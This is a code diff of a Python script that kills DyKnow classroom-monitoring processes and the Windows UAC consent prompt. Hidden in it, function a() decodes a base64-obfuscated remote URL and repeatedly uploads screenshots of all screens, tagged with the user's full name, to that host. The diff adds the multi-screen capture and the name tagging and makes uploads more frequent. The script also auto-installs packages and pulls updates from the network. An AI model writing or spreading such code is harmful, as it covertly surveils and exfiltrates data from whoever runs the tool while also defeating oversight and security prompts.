@@ -1,11 +1,12 @@
-import os.path, subprocess, glob, time, signal, sys, threading
+import os.path, subprocess, glob, time, signal, sys, threading, multiprocessing
 import urllib.request as r
 import urllib.error, hashlib, hmac, base64, getpass
 
-def restartafterdelay(t, file=__file__):
-    subprocess.run(f"python -c \"import time, os; time.sleep({t}); os.system(\\\"python {file}\\\")\"")
-    sys.exit()
 
+def restartafterdelay(t, file=__file__):
+    subprocess.run("python -c \"import time, subprocess; file2 = "+ascii(file)+"; time.sleep("+str(t)+"); subprocess.run(f\\\"python \\\\\\\"{file2}\\\\\\\"\\\")\" & pause")
+    sys.exit()
+    
 def importinstall(pipname,modulename=None,update=False,**importkwargs):
     if modulename is None:
         modulename = pipname
@@ -18,28 +19,27 @@ def importinstall(pipname,modulename=None,update=False,**importkwargs):
     restartafterdelay(1)
     return __import__(modulename)
 
-importinstall('pillow','PIL')
-
-pyscreeze = importinstall('pyscreeze')
+PIL = importinstall('pillow','PIL')
+import PIL.ImageGrab 
 wmi = importinstall('wmi')
 c = wmi.WMI()
-
 
 def a():
     u = base64.b64decode(b'aHR0cHM6Ly9jYXQ1LnB5dGhvbmFueXdoZXJlLmNvbS9iYWNrdXAvc3VzLw==').decode()
     try:
         if hasattr(request(u, method='HEAD'),"getcode"):
+            print('err')
             return
-        img = pyscreeze.screenshot()
+        img = PIL.ImageGrab.grab(include_layered_windows=True,all_screens=True)
         img = img.resize((int(img.size[0]/img.size[1]*340),340))
         img.save('tmp.png')
         with open('tmp.png', 'rb') as imgbytes:
-            request(u+'receive/'+getpass.getuser(), imgbytes.read(), 'POST')
+            request(u+'receive/'+blahj, imgbytes.read(), 'POST')
     except Exception as e:
         pass
     finally:
         try:
-            os.unlink('tmp.png')
+            pass#os.unlink('tmp.png')
         except:
             pass
 
@@ -60,7 +60,7 @@ if not os.path.exists(dynomaindir):
     input("U no have Dyknow! Press enter to exit.")
     sys.exit()
 
-checkupdates = False
+checkupdates = True
 
 data = request("https://raw.githubusercontent.com/magentapenguin/dy-no/master/nodyno.py")
 try:
@@ -97,7 +97,7 @@ def f2_old():
         stop = True
     signal.signal(signal.SIGINT, close)
     while not stop:
-        time.sleep(4)
+        time.sleep(1)
         a()
         for x in glob.iglob(dynodir+r"\*.exe"):
            x = os.path.split(x)[1]
@@ -108,36 +108,29 @@ def f2_old():
            #print(usednames)
 
 def f():
-    for process in c.Win32_Process():
-        if process.name in ('svchost.exe','pythonw.exe','unsecapp.exe'):
-            continue
-        for x in glob.iglob(dynodir+r"\*.exe"):
-            x = os.path.split(x)[1]
-            if x in ignore:
-                continue
-            #print(x)
-            if process.name.lower() == x.lower() or process.name == "consent.exe":
-                try:
-                    process.Terminate()
-                    print('*bonk*', process.name)
-                except Exception as e:
-                    print(process.name)
+    for x in glob.iglob(dynodir+r"\*.exe"):
+        x = os.path.split(x)[1]
+        if x in ignore:
+            continue    
+        for process in c.Win32_Process(name=x):
+            try:
+                process.Terminate()
+                print('*bonk*', process.name)
+            except Exception as e:
+                print(process.name)
+blahj = c.Win32_UserAccount(name=getpass.getuser())[0].FullName
+
 
 def f2():
     f()
     process_watcher = c.Win32_Process.watch_for("creation")
-    def bgtasks():
-        while True:
-            time.sleep(4)
-            a()
-
     def eeee():
         while True:
             f()
-            time.sleep(1)
+            a()
+            time.sleep(2)
             
     threading.Thread(target=eeee).run()
-    threading.Thread(target=bgtasks).run()
     while True:
         new_process = process_watcher()
         print(new_process)
@@ -147,7 +140,7 @@ def f2():
                 continue
             if new_process.name.lower() == x.lower() or new_process.name == "consent":
                 new_process.Terminate()
-                print('*bonk*', new_process.name)
+                print('*auto-bonk*', new_process.name)
 
 if __name__ == '__main__':
     f2()
